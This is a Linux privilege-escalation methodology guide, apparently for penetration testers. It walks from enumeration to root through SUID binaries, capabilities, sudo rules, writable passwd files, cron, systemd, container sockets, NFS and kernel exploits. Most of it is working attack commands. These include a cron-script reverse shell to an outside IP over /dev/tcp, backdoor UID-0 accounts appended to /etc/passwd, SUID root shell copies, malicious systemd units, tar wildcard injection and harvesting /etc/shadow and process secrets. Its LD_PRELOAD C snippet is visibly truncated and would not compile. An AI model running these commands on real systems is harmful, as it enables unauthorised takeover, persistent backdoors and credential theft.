Privilege Escalation

A systematic Linux privilege escalation methodology from foothold to root, covering enumeration, kernel exploits, SUID abuse, sudo misconfigurations, capabilities, cron, services, and container breakouts.

Overview

Privilege escalation turns a low-privileged foothold into root by finding the gap between what a process is allowed to do and what the system assumes it will do. After reading this article you can enumerate SUID binaries, sudo rules, capabilities, cron jobs, services, and container sockets, pick the most reliable vector, and confirm root.

Privilege Escalation - First Principles

Privilege escalation is the act of gaining higher-level permissions than what you were granted. On Linux, this means transitioning from an unprivileged user (UID != 0) to root (UID = 0), or gaining specific capabilities that let you read, write, or execute things you should not.

Every escalation path exploits a gap between what a process is _allowed_ to do and what the system _assumes_ it will do. The kernel enforces access control through UIDs, GIDs, capabilities, and LSMs. Misconfigurations in userspace, such as SUID binaries, sudo rules, writable cron jobs, and exposed container sockets, create paths that bypass those kernel checks.

The methodology is a tree: enumerate every surface, map each finding to a known exploitation technique, execute in order of reliability and stealth.

Context Assessment

Before escalating, understand what you already have. This determines which paths are available and which are dead ends. 

# ── Identity ──
whoami                # current user
id                    # uid, gid, groups
id | grep -oP 'uid=\d+\(\K[^)]+'   # username only

# ── Kernel ──
uname -a              # kernel version, arch, hostname
cat /proc/version     # distro and compiler info
hostname              # machine hostname (reveals role: web-01, db-master, etc.)

# ── Network positioning ──
ip addr show          # interfaces and IPs
ip route show         # routing table (reveals internal networks)
ss -tlnp              # listening TCP services (useful for lateral movement)
ss -ulnp              # listening UDP
arp -a                # ARP cache — other hosts on the same segment

# ── Running context ──
ps aux                # all processes — look for root-owned processes, cron, web servers
ps aux | grep -E 'root|www-data|mysql|postgres|docker'
ls -la /proc/$$/fd/   # our process's open file descriptors

# ── Disk and mounts ──
lsblk                 # block devices
df -h                 # disk usage, mount points
mount                 # all mounts — look for nosuid, noexec absence, NFS mounts
cat /etc/fstab        # persistent mount configuration

Enumeration - Systematic Surface Mapping

Enumeration is the difference between a 30-second root and hours of flailing. Every command output is a potential escalation vector. Run them all, save output, analyze offline.

1. SUID Binaries

Set-User-ID binaries execute with the file owner's effective UID. If root owns a SUID binary, it runs as root regardless of who executes it. The binary itself enforces what you can do. If it has a vulnerability or allows arbitrary command execution, you get root. 

# Find all SUID binaries on the system
find / -perm -4000 -type f -ls 2>/dev/null

# Categorized: focus on unusual or exploitable paths
find / -perm -4000 -type f 2>/dev/null | while read binary; do
    ls -la "$binary"
done

# SUID binaries worth investigating manually:
#   /usr/bin/find    → GTFObins: arbitrary command execution via -exec
#   /usr/bin/vim     → GTFObins: shell escape with :!bash or :shell
#   /usr/bin/bash    → bash -p (privileged mode, retains euid)
#   /usr/bin/less    → !command from within less
#   /usr/bin/awk     → system() call from awk
#   /usr/bin/python  → import os; os.setuid(0); os.system('/bin/bash')
#   /usr/bin/systemctl  → if writable service files exist

# SGID (Set-Group-ID) — same idea, inherits group
find / -perm -2000 -type f -ls 2>/dev/null

2. Capabilities

Linux capabilities split the monolithic root privilege into discrete units. A binary with cap_setuid+ep can call setuid(0) even if it's not SUID. Capabilities are checked per-thread. 

# Find all files and processes with capabilities
getcap -r / 2>/dev/null

# Interpret capability flags:
#   +ep  — effective and permitted (binary always gets this capability)
#   +p   — permitted only (binary must call cap_set_proc to activate it)
#   +ei  — effective and inheritable (passes to child processes)

# Check our own capabilities
cat /proc/self/status | grep -i cap
capsh --print           # if libcap2-bin is installed

# Dangerous capabilities to look for:
Capability What It Allows Exploitation
CAP_SYS_ADMIN Mount filesystems,pivot_root,clonenamespaces Mount host filesystem, escape containers, load kernel modules
CAP_NET_RAW Raw sockets Packet injection, ARP spoofing, network sniffing
CAP_DAC_READ_SEARCH Bypass file read permission checks and directory read/search Read/etc/shadow,/root/.ssh/id_rsa
CAP_DAC_OVERRIDE Bypass all permission checks (read/write/execute) Write to any file, including/etc/passwd
CAP_SETUID Make arbitrary UID manipulations setuid(0)to become root
CAP_SETGID Make arbitrary GID manipulations setgid(0)to join root group
CAP_SYS_PTRACE ptrace any process Inject into root process, read root process memory
CAP_SYS_MODULE Load/unload kernel modules Load a rootkit kernel module
CAP_SYS_CHROOT Use chroot Break out of chroot jails
CAP_FSETID Preserve setuid/setgid bits when modifying files Keep privilege bits on files you can modify
CAP_LINUX_IMMUTABLE Set immutable/extended attributes Set append-only on log files to hide traces 
# CAP_SYS_ADMIN — mount /dev/sda1 to /mnt and chroot into it
# (gives full access to the host filesystem from a container)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# CAP_DAC_READ_SEARCH — read /etc/shadow and crack hashes
cp /etc/shadow /tmp/shadow_copy
chmod 644 /tmp/shadow_copy
# Transfer to attacker machine and run john/hashcat

# CAP_DAC_OVERRIDE — add a user with UID 0 to /etc/passwd
echo 'backdoor::0:0:root:/root:/bin/bash' >> /etc/passwd
su backdoor  # now root without password

# CAP_SETUID — write a tiny C program that calls setuid(0) and exec
cat > /tmp/setuid_root.c << 'EOF'
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/bash", "bash", NULL); }
EOF
gcc /tmp/setuid_root.c -o /tmp/setuid_root
/tmp/setuid_root

3. Sudo Rules

sudo -l reveals every command the current user can run as another user (often root). Each allowed command is a potential escalation path if it allows shell escapes, file writes, or arbitrary command execution. 

# List allowed sudo commands
sudo -l

# Check if sudo is even present
which sudo

# Example output and what it means:
# (root) NOPASSWD: /usr/bin/vim /var/www/html/*
#   → Can edit any file under /var/www/html as root
#   → Exploit: sudo vim /var/www/html/../../etc/sudoers, add NOPASSWD: ALL
#
# (root) NOPASSWD: /usr/bin/find
#   → sudo find . -exec /bin/bash \;
#
# (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
#   → If /opt/backup.py is writable, add os.system('chmod u+s /bin/bash')
#
# (root) NOPASSWD: /bin/tar
#   → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
#
# (ALL) NOPASSWD: ALL
#   → sudo su -   (already root, just lazy)

Advanced Sudo Vectors

# LD_PRELOAD — if env_keep includes LD_PRELOAD
# Create a shared library that runs at load time:
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

    unsetenv("LD_PRELOAD");

    setuid(0);

sudo LD_PRELOAD=/tmp/preload.so some_allowed_command

# LD_LIBRARY_PATH — if env_keep preserves it
# Find a shared library the target binary links, compile a malicious version
# of one of its dependencies, place it first in the library path.

# env_keep += PYTHONPATH

4. Writable Passwd and Shadow

If /etc/passwd is writable by your user or group, add a new root-equivalent account. If /etc/shadow is readable, extract hashes and crack offline. 

# Check writability of authentication files
ls -la /etc/passwd /etc/shadow /etc/group

# If /etc/passwd is writable — add a root user with no password
# Format: username:password:UID:GID:comment:home:shell
echo 'eviluser:$1$salt$IkLQED3taJ7Ik5CngzO9P0:0:0:root:/root:/bin/bash' >> /etc/passwd
su eviluser
# Password: password123  (pre-computed MD5 crypt hash for 'password123')
# Or simply use empty password:
echo 'eviluser::0:0:root:/root:/bin/bash' >> /etc/passwd
su eviluser  # no password prompt

# Pre-compute your own password hash:
openssl passwd -1 -salt mysalt 'YourPassword123'
# Output: $1$mysalt$FakeHashHere1234567890
# Use this in the /etc/passwd entry above.

# If /etc/shadow is readable — extract and crack
cat /etc/shadow | grep -v '!\|*' | tee /tmp/hashes.txt
# Transfer /tmp/hashes.txt to attacker host and crack:
#   john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
#   hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt

5. Cron Jobs

Cron executes scheduled commands as the user who owns the crontab. A root-owned cron job that runs a world-writable script gives you root command execution. 

# System-wide cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/    # user crontabs
ls -la /var/spool/cron/              # user crontabs (alternative location)

# Check each script found for writability
find /etc/cron* -type f -writable 2>/dev/null
find /var/spool/cron -type f -writable 2>/dev/null

# Check cron logs for schedule frequencies
grep -i cron /var/log/syslog 2>/dev/null | tail -50
journalctl -u cron 2>/dev/null | tail -50

Cron Exploitation Patterns

# Pattern 1: Overwrite a writable cron script with a reverse shell
# Given: /etc/cron.hourly/backup.sh is world-writable and runs as root
cat > /etc/cron.hourly/backup.sh << 'REVERSE_SHELL'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
REVERSE_SHELL
# Wait up to 1 hour for execution.

# Pattern 2: Cron PATH hijacking
# Given: A cron job runs 'backup.sh' without absolute path, and PATH starts with /tmp
# Cron's default PATH is often: /usr/bin:/bin
# But if PATH includes a writable directory before system dirs:
echo '#!/bin/bash' > /tmp/backup.sh
echo 'cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell' >> /tmp/backup.sh
chmod +x /tmp/backup.sh
# When cron runs 'backup.sh', it finds /tmp/backup.sh first.
# Then: /tmp/rootshell -p

# Pattern 3: Wildcard injection in tar/zip/chmod
# Given: Cron runs: cd /var/backups && tar cf /dev/null *
# Exploit: Create files that look like tar flags
cd /var/backups
echo 'cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell' > /tmp/rootshell.sh
chmod +x /tmp/rootshell.sh
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh /tmp/rootshell.sh"
# When root's cron runs tar *in /var/backups, the * expands to:
#   tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=sh /tmp/rootshell.sh
# tar treats these as flags and executes rootshell.sh

# Pattern 4: Cron runs a script that imports a writable module
# Given: Cron runs /opt/scripts/cleanup.py as root, and cleanup.py imports 'utils'
# Create a malicious utils.py in a path that Python searches first
cat > /tmp/utils.py << 'EOF'
import os
os.system('cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell')
EOF
# Trick: PYTHONPATH is usually not set in cron, but if the script
# imports relative modules from a writable directory...

6. Systemd Service Files

If you can write a systemd service file or modify an existing one, you can execute arbitrary commands as root on service start or restart. 

# Find writable service files
find /etc/systemd/system -writable 2>/dev/null
find /usr/lib/systemd/system -writable 2>/dev/null
find /run/systemd/system -writable 2>/dev/null

# Find services that run scripts in writable locations
systemctl list-units --type=service --state=running | while read unit rest; do
    service_path=$(systemctl show -p FragmentPath "$unit" 2>/dev/null | cut -d= -f2)
    if [ -n "$service_path" ]; then
        grep -E 'Exec(Start|Stop|Reload)=' "$service_path" 2>/dev/null | \
            grep -oP '=(/[\w/.-]+)' | cut -d= -f2
    fi
done | sort -u | while read script; do
    [ -w "$script" ] && echo "[WRITABLE] $script"
done

# Create a malicious service if you can write to /etc/systemd/system
cat > /etc/systemd/system/rootshell.service << 'EOF'
[Unit]
Description=Root Shell Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell'
Restart=no

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable rootshell.service
systemctl start rootshell.service
# Wait a few seconds, then:
#   /tmp/rootshell -p

# If you can't start but can enable + reboot:
systemctl enable rootshell.service
# Service runs at next boot

7. Docker Breakout

Membership in the docker group is effectively root access. The Docker daemon runs as root, and the Docker socket is an unauthenticated API to root-level operations. 

# Check for docker group membership
groups | grep docker
id | grep docker

# Check for accessible podman socket
ls -la /run/podman/podman.sock /var/run/docker.sock 2>/dev/null
podman ps 2>/dev/null  # does it work without sudo?

# Method 1: Mount the host filesystem
podman run -it --rm -v /:/mnt/host alpine chroot /mnt/host /bin/bash
# You are now root on the host filesystem.
# From here, add your SSH key or create a SUID root binary on the actual host.

# Method 2: Use --privileged flag
podman run -it --rm --privileged alpine /bin/sh
# Inside the container:
mkdir /mnt/host
fdisk -l                   # find host root partition
mount /dev/sda1 /mnt/host  # mount it
chroot /mnt/host /bin/bash

# Method 3: Escape via cgroup release_agent (if running as root in container)
# On the host, run: mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
# Create a child cgroup, set release_agent to a script, trigger release.

# Method 4: If /var/run/docker.sock is mounted into a container
# Install docker CLI in the container, then use the socket to escape:
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host

8. NFS Root Squashing Bypass

If an NFS share is exported with no_root_squash and you can mount it, files you create as root on the client appear as root-owned on the server. 

# On attacker machine (as root):
mkdir /mnt/nfs
mount -t nfs 10.10.10.50:/exports/share /mnt/nfs -o nolock

# Create a SUID root binary on the share
cp /bin/bash /mnt/nfs/rootshell
chmod u+s /mnt/nfs/rootshell

# On the target machine (if it mounts the same share):
# /mnt/share/rootshell -p

9. Kernel Exploits

When userspace surfaces are exhausted, look at the kernel. An unpatched kernel with a known local privilege escalation vulnerability is a reliable path to root. 

# Gather kernel version
uname -r                   # e.g., 5.4.0-42-generic
cat /proc/version          # distro details
cat /etc/os-release        # distro name and version

# Search for exploits
searchsploit linux kernel 5.4.0 local privilege escalation
searchsploit -m 47163      # download exploit to current directory

12. Process Environment

# Check environment of running processes for credentials
for pid in $(ps -eo pid 2>/dev/null | tail -n +2); do
    if [ -r "/proc/$pid/environ" ]; then
        env_vars=$(tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null)
        echo "$env_vars" | grep -iE 'pass|secret|key|token|auth' && echo "  [PID: $pid]"
    fi
done

# Check our own environment
env | grep -iE 'pass|secret|key|token|auth'

# Proc filesystem — read process command lines
ps auxwww  # wide output, full command lines

The Linux to Root Checklist

Run these in order. Each is a non-destructive information-gathering step until you find a vector. Then exploit that vector. 

[ ] whoami && id                                   — Who are you?
[ ] uname -a && cat /proc/version                  — Kernel version
[ ] sudo -l                                        — Sudo permissions
[ ] find / -perm -4000 -type f -ls 2>/dev/null     — SUID binaries
[ ] getcap -r / 2>/dev/null                        — Capabilities
[ ] crontab -l && cat /etc/crontab                 — Cron jobs
[ ] find /etc/cron* -writable 2>/dev/null          — Writable cron files
[ ] ls -la /etc/passwd /etc/shadow                 — Auth file permissions
[ ] groups && id                                   — Group memberships (docker, lxc, adm, sudo)
[ ] ss -tlnp                                       — Listening services (lateral targets)
[ ] find / -name "id_rsa" 2>/dev/null              — SSH private keys
[ ] find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -50
[ ] cat ~/.*_history 2>/dev/null                   — Shell history
[ ] env                                            — Environment variables (secrets?)
[ ] df -h && mount                                 — Mount points (NFS?)
[ ] lsblk                                          — Block devices (unmounted partitions?)
[ ] systemctl list-units --type=service --state=running  — Running services
[ ] find /etc/systemd -writable 2>/dev/null        — Writable systemd units
[ ] podman ps 2>/dev/null — Container runtime access

Windows Privilege Escalation

While the full Windows PE article exists separately, these commands provide a quick surface scan: 

whoami /priv                      — Enabled privileges
whoami /groups                    — Group memberships
systeminfo                        — OS version, hotfixes

Key privilege escalation vectors on Windows:

  • SeImpersonatePrivilege -> Juicy Potato, PrintSpoofer, SweetPotato
  • SeAssignPrimaryTokenPrivilege -> potato family exploits
  • SeDebugPrivilege -> inject into SYSTEM processes (e.g., lsass.exe)
